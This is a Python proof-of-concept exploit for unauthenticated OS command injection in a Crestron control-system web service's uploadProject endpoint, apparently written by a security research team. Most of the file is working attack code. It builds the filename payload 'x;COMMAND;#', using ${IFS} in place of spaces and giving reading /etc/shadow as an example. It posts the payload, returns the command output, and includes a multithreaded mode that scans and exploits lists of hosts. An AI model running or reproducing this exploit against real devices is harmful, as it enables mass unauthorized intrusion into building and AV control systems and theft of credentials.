#!/usr/bin/env python3
"""
[REDACTED-ID]_005: Crestron CWS uploadProject OS Command Injection — PoC

Exploits: TSXsystemInfoServiceImpl::uploadProject() in libRXModeHandler.so
  1. /cws excluded from authentication on control systems ([REDACTED-ID]_004)
  2. uploadProject() escapes ONLY spaces in the filename parameter
  3. All other shell metacharacters (;|&$`...) pass through
  4. snprintf() interpolates the filename into a system() call
  5. → OS command injection (unauthenticated on affected device types)

Injection Mechanics:
  Filename input:    x;COMMAND;#
  Space escaping:    x;COMMAND;#   (no spaces to escape)
  system() call:     system("ls -la /ROMDISK/user/program/x;COMMAND;# ...")
  Shell interprets:  ls(fails) ; COMMAND(executes) ; #(comments out rest)

  For commands with spaces, use ${IFS}:
  Filename input:    x;cat${IFS}/etc/shadow;#
  Shell interprets:  ls(fails) ; cat /etc/shadow(executes) ; #(comments out rest)

Usage:
    # Single host:
    python3 cf3_005_uploadproject_rce.py <host> -c "id"

    # Scan a list of hosts from a file:
    python3 cf3_005_uploadproject_rce.py -f targets.txt -c "id"

    # Recon-only mode (check /cws accessibility, no injection):
    python3 cf3_005_uploadproject_rce.py -f targets.txt --recon

Note on scope:
    /cws is only excluded from auth on control system devices (CP4, MC4, DIN-AP)
    in program0 mode or with the IAmControlSystem flag set. Many device types
    (TSW touchscreens, standalone AirMedia) protect /cws behind auth (301) or
    don't expose it at all (404). The --recon flag identifies which hosts are
    actually reachable.

Authors: [REDACTED] Team
Date:    2026-03-03
"""

import argparse
import json
import ssl
import sys
import threading
import http.client
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


# ─── Configuration ──────────────────────────────────────────────────────────

REQUEST_TIMEOUT = 10


# ─── HTTP Transport ─────────────────────────────────────────────────────────

def make_request(host, port, method, path, body=None, headers=None, use_ssl=True):
    """Make HTTP/HTTPS request. Returns (status_code, body_text)."""
    if headers is None:
        headers = {}
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT,
                                                context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)

        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        conn.close()
        return status, resp_body
    except Exception as e:
        return 0, str(e)


# ─── Exploit ─────────────────────────────────────────────────────────────────

def build_injection_filename(command):
    """Build the injection payload for uploadProject's space-only escaping."""
    command_nospace = command.replace(" ", "${IFS}")
    return f"x;{command_nospace};#"


def recon_host(host, port, use_ssl):
    """Probe a host's /cws endpoint and classify its response.

    Returns a dict with:
      status:  'open' | 'auth_required' | 'not_found' | 'error'
      code:    HTTP status code (0 on connection failure)
      detail:  Human-readable description
    """
    proto = "https" if use_ssl else "http"
    result = {"host": host, "port": port, "proto": proto}

    # Probe /cws root
    status, body = make_request(host, port, "GET", "/cws/", use_ssl=use_ssl)

    if status == 0:
        result.update(status="error", code=0, detail=f"Connection failed: {body[:80]}")
        return result

    if status == 404:
        result.update(status="not_found", code=404, detail="/cws endpoint does not exist")
        return result

    if status in (301, 302, 303, 307, 308):
        result.update(status="auth_required", code=status,
                      detail=f"Redirected (HTTP {status}) — auth enforced")
        return result

    if status == 401 or status == 403:
        result.update(status="auth_required", code=status,
                      detail=f"Auth required (HTTP {status})")
        return result

    if status == 200:
        # Check if response looks like CWS
        try:
            data = json.loads(body)
            modules = data.get("Modules", data.get("modules", []))
            if modules:
                result.update(status="open", code=200,
                              detail=f"CWS OPEN — modules: {', '.join(modules)}")
            else:
                result.update(status="open", code=200,
                              detail=f"HTTP 200 — response: {body[:80]}")
        except json.JSONDecodeError:
            result.update(status="open", code=200,
                          detail=f"HTTP 200 — non-JSON response: {body[:80]}")
        return result

    result.update(status="unknown", code=status,
                  detail=f"Unexpected HTTP {status}: {body[:80]}")
    return result


def exploit(host, port, use_ssl, command, verbose=True):
    """Execute [REDACTED-ID]_005 against a single host. Returns (success, output)."""
    proto = "https" if use_ssl else "http"

    if verbose:
        print(f"\n{'='*70}")
        print(f"  [REDACTED-ID]_005: uploadProject COMMAND INJECTION")
        print(f"  Target:  {proto}://{host}:{port}")
        print(f"  Command: {command}")
        print(f"{'='*70}\n")

    # Step 1: Verify /cws is accessible
    if verbose:
        print(f"[STEP 1/3] Checking /cws accessibility...")

    status, body = make_request(host, port, "GET", "/cws/", use_ssl=use_ssl)

    if status == 0:
        if verbose:
            print(f"    [FAIL] Connection failed: {body}")
        return False, ""
    elif status == 404:
        if verbose:
            print(f"    [FAIL] /cws not found (HTTP 404)")
        return False, ""
    elif status in (301, 302, 303, 307, 308, 401, 403):
        if verbose:
            print(f"    [FAIL] /cws requires authentication (HTTP {status})")
        return False, ""
    elif status == 200:
        if verbose:
            print(f"    [PASS] /cws accessible (HTTP {status})")

    # Step 2: Verify uploadproject endpoint
    if verbose:
        print(f"\n[STEP 2/3] Checking uploadproject endpoint...")

    status, body = make_request(
        host, port, "POST", "/cws/systeminfo/uploadproject",
        body=json.dumps({"filename": "test.cxl"}),
        headers={"Content-Type": "application/json"},
        use_ssl=use_ssl)

    if status == 0:
        if verbose:
            print(f"    [FAIL] Connection failed: {body}")
        return False, ""
    elif status == 404:
        if verbose:
            print(f"    [FAIL] uploadproject endpoint not found (HTTP 404)")
        return False, ""
    elif status in (301, 302, 401, 403):
        if verbose:
            print(f"    [FAIL] uploadproject requires auth (HTTP {status})")
        return False, ""

    if verbose:
        print(f"    [PASS] uploadproject accessible (HTTP {status})")

    # Step 3: Inject
    injection = build_injection_filename(command)

    if verbose:
        print(f"\n[STEP 3/3] Injecting: {injection}")

    payload = json.dumps({"filename": injection})
    status, body = make_request(
        host, port, "POST", "/cws/systeminfo/uploadproject",
        body=payload,
        headers={"Content-Type": "application/json"},
        use_ssl=use_ssl)

    if status == 0:
        if verbose:
            print(f"    [FAIL] Connection failed: {body}")
        return False, ""

    output = ""
    try:
        data = json.loads(body)
        output = data.get("System_Output", "")
        cmd_constructed = data.get("Command_Constructed", "")

        if verbose:
            print(f"    [PASS] Response: HTTP {status}")
            print(f"\n{'='*70}")
            print(f"  COMMAND OUTPUT:")
            print(f"{'='*70}")
            print(f"\n{output}\n")
            print(f"{'='*70}")
    except json.JSONDecodeError:
        output = body
        if verbose:
            print(f"\n  Raw response: {body[:500]}")

    return True, output


# ─── Batch Scanner ───────────────────────────────────────────────────────────

def load_hosts(filepath):
    """Load host list from a text file (one IP/hostname per line)."""
    hosts = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                hosts.append(line)
    return hosts


def run_batch_recon(hosts, port, use_ssl, outfile, max_threads=20):
    """Recon-only scan: classify each host's /cws accessibility (multithreaded).
    Writes results to outfile: IP | STATUS."""
    print(f"\n{'='*70}")
    print(f"  [REDACTED-ID]_005 RECON SCAN — {len(hosts)} hosts — {max_threads} threads")
    print(f"  Output: {outfile}")
    print(f"{'='*70}\n")

    counts = {"open": 0, "auth_required": 0, "not_found": 0, "error": 0, "unknown": 0}
    lock = threading.Lock()
    progress = [0]
    total = len(hosts)
    results_list = [None] * total  # preserve order

    def _worker(idx, host):
        r = recon_host(host, port, use_ssl)
        tag = r["status"].upper()
        code_str = f"HTTP {r['code']}" if r["code"] else "CONN ERR"
        with lock:
            progress[0] += 1
            counts[r["status"]] = counts.get(r["status"], 0) + 1
            print(f"  [{progress[0]:>4}/{total}] {host:<40s} [{tag:<14s}] {code_str:<10s} {r['detail']}")
            sys.stdout.flush()
        results_list[idx] = r
        return r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()

    # Write results in original host order
    with open(outfile, "w") as f:
        f.write(f"# [REDACTED-ID]_005 Recon — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | HTTP_CODE | DETAIL\n\n")
        for r in results_list:
            host = r["host"]
            tag = r["status"].upper()
            code_str = f"HTTP {r['code']}" if r["code"] else "CONN ERR"
            if r["status"] == "open":
                f.write(f"{host} | VULNERABLE | {code_str} | {r['detail']}\n")
            else:
                f.write(f"{host} | {tag} | {code_str} | {r['detail']}\n")

    # Summary
    print(f"\n{'='*70}")
    print(f"  RECON SUMMARY")
    print(f"{'='*70}")
    print(f"  OPEN (unauth /cws):   {counts.get('open', 0):>4}  ← POTENTIALLY VULNERABLE")
    print(f"  AUTH REQUIRED (301):  {counts.get('auth_required', 0):>4}  ← Protected")
    print(f"  NOT FOUND (404):      {counts.get('not_found', 0):>4}  ← No CWS endpoint")
    print(f"  CONNECTION ERROR:     {counts.get('error', 0):>4}  ← Unreachable")
    print(f"  UNKNOWN:              {counts.get('unknown', 0):>4}")
    print(f"  TOTAL:                {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    return counts


def run_batch_exploit(hosts, port, use_ssl, command, outfile, max_threads=20):
    """Exploit scan: attempt [REDACTED-ID]_005 on each host (multithreaded).
    Writes results to outfile: IP | OUTPUT."""
    print(f"\n{'='*70}")
    print(f"  [REDACTED-ID]_005 BATCH EXPLOIT — {len(hosts)} hosts — {max_threads} threads")
    print(f"  Command: {command}")
    print(f"  Output:  {outfile}")
    print(f"{'='*70}\n")

    succeeded_count = [0]
    failed_count = [0]
    lock = threading.Lock()
    progress = [0]
    total = len(hosts)
    results_list = [None] * total  # preserve order

    def _worker(idx, host):
        # Quick recon first
        r = recon_host(host, port, use_ssl)
        if r["status"] != "open":
            code_str = f"HTTP {r['code']}" if r["code"] else "CONN ERR"
            with lock:
                progress[0] += 1
                failed_count[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [SKIP] {r['status'].upper():<14s} {code_str}")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "tag": r["status"].upper(),
                                 "detail": r["detail"], "vuln": False}
            return

        # Attempt injection
        injection = build_injection_filename(command)
        payload = json.dumps({"filename": injection})
        status, body = make_request(
            host, port, "POST", "/cws/systeminfo/uploadproject",
            body=payload,
            headers={"Content-Type": "application/json"},
            use_ssl=use_ssl)

        if status == 0:
            with lock:
                progress[0] += 1
                failed_count[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [FAIL] Connection lost during exploit")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "tag": "ERROR",
                                 "detail": "Connection failed during exploit", "vuln": False}
            return

        # Parse output
        output = ""
        try:
            data = json.loads(body)
            output = data.get("System_Output", "").strip()
        except json.JSONDecodeError:
            output = body[:200].strip()

        if output:
            output_oneline = output.replace("\n", " | ")
            with lock:
                progress[0] += 1
                succeeded_count[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [VULN] → {output[:60]}")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "tag": "VULNERABLE",
                                 "output": output_oneline, "vuln": True}
        else:
            with lock:
                progress[0] += 1
                failed_count[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [????] HTTP {status} — no output captured")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "tag": "UNKNOWN",
                                 "detail": f"HTTP {status}, empty output", "vuln": False}

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()

    # Write results in original host order
    with open(outfile, "w") as f:
        f.write(f"# [REDACTED-ID]_005 Exploit — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Command: {command}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | OUTPUT\n\n")
        for r in results_list:
            host = r["host"]
            if r["vuln"]:
                f.write(f"{host} | VULNERABLE | {r['output']}\n")
            else:
                f.write(f"{host} | {r['tag']} | {r.get('detail', '')}\n")

    # Summary
    print(f"\n{'='*70}")
    print(f"  BATCH RESULTS")
    print(f"{'='*70}")
    print(f"  VULNERABLE:  {succeeded_count[0]:>4}")
    print(f"  NOT VULN:    {failed_count[0]:>4}")
    print(f"  TOTAL:       {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    return succeeded_count[0], failed_count[0]


# ─── Entry Point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="[REDACTED-ID]_005: Crestron CWS uploadProject Command Injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Single host:
  %(prog)s [REDACTED-INTERNAL-IP] -c "id"

Batch scan from file (results written to cf3_005_results.txt):
  %(prog)s -f targets.txt -c "id"

Recon-only (no injection, just classify /cws accessibility):
  %(prog)s -f targets.txt --recon

Custom output file:
  %(prog)s -f targets.txt -c "id" -o scan_results.txt

Custom port / no SSL:
  %(prog)s -f targets.txt --port 80 --no-ssl --recon

Note: /cws is only unauthenticated on control system devices (CP4, MC4,
DIN-AP) in program0 mode. Touchscreens and standalone devices typically
return 301 (auth redirect) or 404. Use --recon to identify which hosts
have an open /cws endpoint before attempting exploitation.
        """)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("host", nargs="?", default=None,
        help="Single target IP or hostname")
    group.add_argument("-f", "--file",
        help="File with target IPs/hostnames (one per line)")

    parser.add_argument("-c", "--command", default="id",
        help="OS command to execute (default: id)")
    parser.add_argument("-o", "--output", default=None,
        help="Output results file (default: cf3_005_results.txt)")
    parser.add_argument("--port", type=int, default=443,
        help="Target port (default: 443)")
    parser.add_argument("--no-ssl", action="store_true",
        help="Use HTTP instead of HTTPS")
    parser.add_argument("--recon", action="store_true",
        help="Recon only — classify /cws accessibility, no injection")
    parser.add_argument("-t", "--threads", type=int, default=20,
        help="Number of concurrent threads for batch mode (default: 20)")
    parser.add_argument("-q", "--quiet", action="store_true",
        help="Minimal output (single-host mode only)")

    args = parser.parse_args()
    use_ssl = not args.no_ssl
    if args.no_ssl and args.port == 443:
        args.port = 80

    # ─── Batch mode ──────────────────────────────────────────────────────
    if args.file:
        try:
            hosts = load_hosts(args.file)
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}", file=sys.stderr)
            sys.exit(1)

        if not hosts:
            print(f"[!] No hosts found in {args.file}", file=sys.stderr)
            sys.exit(1)

        outfile = args.output or "cf3_005_results.txt"

        if args.recon:
            counts = run_batch_recon(hosts, args.port, use_ssl, outfile,
                                     max_threads=args.threads)
            vulnerable_count = counts.get("open", 0)
        else:
            vuln_count, _ = run_batch_exploit(hosts, args.port, use_ssl, args.command,
                                               outfile, max_threads=args.threads)
            vulnerable_count = vuln_count

        sys.exit(0 if vulnerable_count > 0 else 1)

    # ─── Single-host mode ────────────────────────────────────────────────
    if args.recon:
        r = recon_host(args.host, args.port, use_ssl)
        print(f"{args.host}: [{r['status'].upper()}] HTTP {r['code']} — {r['detail']}")
        sys.exit(0 if r["status"] == "open" else 1)

    success, output = exploit(
        args.host, args.port, use_ssl, args.command,
        verbose=not args.quiet)

    if args.quiet and output:
        print(output)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
